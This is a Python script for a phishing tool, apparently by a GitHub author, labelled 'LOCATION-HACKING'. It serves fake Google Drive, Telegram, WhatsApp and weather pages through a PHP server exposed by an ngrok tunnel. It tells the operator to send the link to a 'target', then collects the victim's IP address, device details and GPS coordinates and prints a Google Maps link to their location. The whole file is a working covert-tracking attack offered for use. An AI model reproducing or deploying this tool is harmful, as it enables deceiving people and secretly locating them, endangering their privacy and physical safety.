from pyngrok import ngrok,conf
from colorama import Fore,Style 
import os
import subprocess
import urllib
import sys
import requests
import time
import json
import time
import platform

try:

    with open("config.json","r") as read_file:

        try:        
            deta = json.load(read_file)
            port = deta['port']
            token = deta['token']
            region = deta['region']
            stat_file = "0"
            stat_file_ip = "0"

        except json.decoder.JSONDecodeError:
            config_file = open("config.json","w")
            payload_config = {"token":"Your ngrok token","port":"8080","region":"au"}
            config_file.write(str(payload_config).replace("'",'"'))
            config_file.close()

            stat_file = "0"
            stat_file_ip = "0"
        
        temp = ""

except FileNotFoundError:
    config_file = open("config.json","w")
    payload_config = {"token":"Your ngrok token","port":"8080","region":"au"}
    config_file.write(str(payload_config).replace("'",'"'))
    config_file.close()

    with open("config.json","r") as read_file:

        deta = json.load(read_file)
        port = deta['port']
        token = deta['token']
        region = deta['region']

        stat_file = "0"
        stat_file_ip = "0"

    osname = platform.uname() [0]
    osname = str(osname) .lower()

    stat_file = "0"
    stat_file_ip = "0"

def start():

    def banner():

        osname = platform.uname() [0]
        osname = str(osname) .lower()

        if "win" in osname:
            subprocess.call(("cls"),shell=True)
            print(Style.RESET_ALL)
            subprocess.call(("neofetch","-c","red","-ac","green"),shell=True)

        else:
            subprocess.call(("clear"),shell=True)
            print(Style.RESET_ALL)
            subprocess.call(("neofetch"),shell=True)

    def show_option():

        print(Fore.LIGHTMAGENTA_EX+"-----------------------------  "+Fore.WHITE+"Setting"+Fore.LIGHTMAGENTA_EX+"  -----------------------------"+"\n")
        print(Style.RESET_ALL)
        print(Fore.LIGHTMAGENTA_EX+"1) "+Fore.WHITE+"Ngrok Tokan : "+Fore.YELLOW+token)
        print(Fore.LIGHTMAGENTA_EX+"1) "+Fore.WHITE+"Ngrok Region : "+Fore.YELLOW+region)
        print(Fore.LIGHTMAGENTA_EX+"2) "+Fore.WHITE+"Server Port : "+Fore.YELLOW+port)
        print("\n\n\n"+Fore.LIGHTMAGENTA_EX+"00) "+Fore.WHITE+"Back To Menu")
        print(Fore.LIGHTMAGENTA_EX+"99) "+Fore.WHITE+"REST To Defult Setting"+"\n")

        try:
            back_to_menu = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"HACKING-TOOLS"+Fore.BLUE+"~"+Fore.WHITE+"@SETTING"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")

            if "00" in back_to_menu:
                pass

            elif back_to_menu == "99":
        
                config_file = open("config.json","w")
                payload_config = {"token":"Your ngrok token","port":"8080","region":"au"}
                config_file.write(str(payload_config).replace("'",'"'))
                config_file.close()

                try:
                    input("\n"+Fore.RED+" [+] "+Fore.WHITE+"Settings returned to default, successfully."+"\n")

                except KeyboardInterrupt:
                    pass

            else:
                pass
        except KeyboardInterrupt:
            pass

    def main_menu():
        time.sleep(0.1)
        print(Fore.RED+" ["+Fore.WHITE+"*"+Fore.RED+"]"+Fore.CYAN+" Choose one of the options below \n")
        time.sleep(0.1)
        print(Fore.RED+" [1]"+Fore.WHITE+" Get Location! \n")
        time.sleep(0.1)
        print(Fore.RED+" [2]"+Fore.WHITE+" Setting Tools "+Fore.GREEN+"\n")
        time.sleep(0.1)
        print(Fore.RED+" [3]"+Fore.WHITE+" Developer \n")
        time.sleep(0.1)
        print(Fore.RED+" [4]"+Fore.WHITE+" Exit . . .\n")

    def select_template():
        time.sleep(0.1)
        print(Fore.RED+" ["+Fore.WHITE+"*"+Fore.RED+"]"+Fore.CYAN+" Choose one of the options below \n")
        time.sleep(0.1)
        print(Fore.RED+" [1]"+Fore.WHITE+" Google Ddrive \n")
        time.sleep(0.1)
        print(Fore.RED+" [2]"+Fore.WHITE+" NearYou\n")
        time.sleep(0.1)
        print(Fore.RED+" [3]"+Fore.WHITE+" Telegram "+Fore.GREEN+"\n")
        time.sleep(0.1)
        print(Fore.RED+" [4]"+Fore.WHITE+" Whatsapp "+Fore.GREEN+"[New]\n")
        time.sleep(0.1)
        print(Fore.RED+" [5]"+Fore.WHITE+" Weather "+Fore.GREEN+"[New]\n")

    def develper():
        print (Fore.GREEN+" [*]"+Fore.BLUE+"  Develper : Ehsan Goli \n")
        time.sleep(0.1)
        print (Fore.GREEN+" [*]"+Fore.MAGENTA+"  My Github : github.com/ehsangoli\n")
        time.sleep(0.1)
        print (Fore.GREEN+" [*]"+Fore.CYAN+"  Telegram Channel ID @ ehsangoli \n")
        time.sleep(0.1)
        
        try:
            input(Fore.LIGHTRED_EX+" [*]  Back To Menu (Press Enter...) ")
        except:
            print(Style.RESET_ALL)
            sys.exit()

    def server():
        
        global port

        with open("logs/server.log","w") as phplog:
            subprocess.Popen(("php","-S","localhost:"+port,"-t",temp),stderr=phplog,stdout=phplog)
    
        conf.get_default().region = region
        tunnel = ngrok.connect(port,"http",auth_token=token)
        tunnel = str(tunnel) .replace("NgrokTunnel:","") .replace("http://","https://") .replace('"','') .replace("->","") .replace("https://localhost:"+port,"") .replace(" ","")
    
        print(Fore.RED+" [!] "+Fore.WHITE+"Your Ngrok Tunnel : "+tunnel)
        print(Fore.YELLOW+"\n [+] "+Fore.WHITE+"Please Send Link To Target"+"\n")
    
    stat_file = "0"
    stat_file_ip = "0"

    def info():

        global stat_file

        if not str(os.stat(temp+"php/info.json").st_size) == stat_file:
            stat_file = str(os.stat(temp+"php/info.json").st_size)
            
            info_file = open(temp+"php/info.json","r") 
            read_file = info_file.read()


        try:
            myjson = json.loads(read_file)

            for value in myjson['dev']:
                
                print(Fore.GREEN+" [!] "+Fore.WHITE+f'OS IP : {str(value["ip"])} Opened Link On {time.ctime()}'.title())
                print(Fore.GREEN+" [!] "+Fore.WHITE+"OS Ram : "+value['browser'].title())
                print(Fore.GREEN+" [!] "+Fore.WHITE+"OS Platform : "+value['platform'].title())
                print(Fore.GREEN+" [!] "+Fore.WHITE+"CPU Cores : "+value['cores'].title())
                print(Fore.GREEN+" [!] "+Fore.WHITE+"Browser Name : "+value['browser'].title())
                print("")

                file_recv = open(temp+"php/info.json","w")
                file_recv.write("")
                file_recv.close()

        except:
            pass
    

    def recv_loc():    
        global stat_file_ip
        
        if not str(os.stat(temp+'php/result.json').st_size) == stat_file_ip:

            stat_file_ip = str(os.stat(temp+'php/result.json').st_size)
            read_file  = open(temp+'php/result.json',"r") .read()
    
            try:
                myjson = json.loads(read_file)

                for value in myjson['info']:
                    print(Fore.WHITE+"\n Google Map Link : "+Fore.GREEN+f"https://www.google.com/maps/place/{value['lat']}+{value['lon']}")
                
                print(Fore.GREEN+"\n [!] "+Fore.WHITE+"Ha Ha Ha (: ")
                file_recv = open(temp+"php/result.json","w")
                file_recv.write("")
                file_recv.close()
                
            except:
                print("")   

    def recv_loc_error():
        global stat_file_ip
        
        if not str(os.stat(temp+'php/result.txt').st_size) == stat_file_ip:

            stat_file_ip = str(os.stat(temp+'php/result.txt').st_size)
            read_file  = open(temp+'php/result.txt',"r") .read()
    
            try:
                print(Fore.RED+" [!] "+Fore.WHITE+read_file)

                file_recv = open(temp+"php/result.txt","w")
                file_recv.write("")
                file_recv.close()
                
            except:
                print("")   


    try:
        def starting_tools():
            banner()
            server()

            while True:
                info()
                recv_loc()
                recv_loc_error()

        banner()
        main_menu()

        number = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"LOCATION-HACKING"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")

        if number == "1":

            banner()
            select_template()

            input1 = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"LOCATION-HACKING"+Fore.BLUE+"~"+Fore.WHITE+"@TEMPLATE"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")

            if input1 == "1":
                temp = "template/gdrive/"
                status = True
            elif input1 == "2":
                temp = "template/nearyou/"
                status = True

            elif input1 == "3":
                temp = "template/telegram/"
                status = True
            elif input1 == "4":
                temp = "template/whatsapp/"
                status = True
            elif input1 == "5":
                temp = "template/weather/"
                status = True

            else:
                status = False
                input(Fore.RED+"\n"+Fore.WHITE+"Please Enter Template Valid! (precess Enter)")

            if not status == True:
                pass

            else:
                starting_tools()
        
        elif number == "2":
            banner()
            show_option()


        elif number == "3":
            banner()
            develper()
        
        elif number == "4":
            print(Style.RESET_ALL)
        
        else:
            input(Fore.RED+"\n"+Fore.WHITE+"Please Enter Number Valid! (precess Enter)")
        

    except KeyboardInterrupt:
        
        with open("logs/exit.log","w") as exit_log:
            
            osname = platform.uname() [0]
            osname = str(osname) .lower()
            
            if "win" in osname:
                subprocess.Popen(("taskkill","/F","/IM","php*"),stderr=exit_log,stdout=exit_log)
                subprocess.Popen(("taskkill","/F","/IM","ngrok*"),stderr=exit_log,stdout=exit_log)

            else:
                subprocess.Popen(("taskkill","php"),stderr=exit_log,stdout=exit_log)
                subprocess.Popen(("taskkill","ngrok"),stderr=exit_log,stdout=exit_log)

        sys.exit()

while True:
    start()
